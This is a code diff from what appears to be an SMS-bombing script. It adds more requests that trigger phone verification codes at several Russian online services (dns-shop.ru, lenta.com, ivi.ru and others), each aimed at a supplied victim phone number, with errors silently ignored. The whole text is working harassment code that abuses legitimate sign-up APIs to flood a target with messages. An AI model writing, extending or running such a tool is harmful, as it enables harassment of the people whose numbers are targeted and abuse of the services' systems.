@@ -70,6 +70,27 @@ try:
         except:
             print(colored('dns-shop.ru-[-]', 'magenta'))
         try:
+            a = requests.get('https://app.smmapp.me/api/v1/auth/sms?phone=' + phone, headers=headers)
+        except:
+            pass
+        try:
+            a = requests.post('https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration', headers=headers,
+                      json={"password":"","login": phone})
+        except:
+            pass
+        try:
+            a = requests.post("https://www.dns-shop.ru/auth/auth/fast-authorization/", headers=headers, data={"FastAuthorizationLoginLoadForm[login]" : phone})
+        except:
+            pass
+        try:
+            a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", headers=headers, json={"phone" : "+" + phone})
+        except:
+            pass
+        try:
+            a = requests.post("https://api.ivi.ru/mobileapi/user/register/phone/6", headers=headers, data={"phone" : phone})
+        except:
+            pass
+        try:
             a = requests.post("https://lenta.com/api/v1/registration/requestValidationCode", headers=headers,
                               json={"phone": "+" + phone})
             print(colored('lenta.com-[+]', 'blue'))
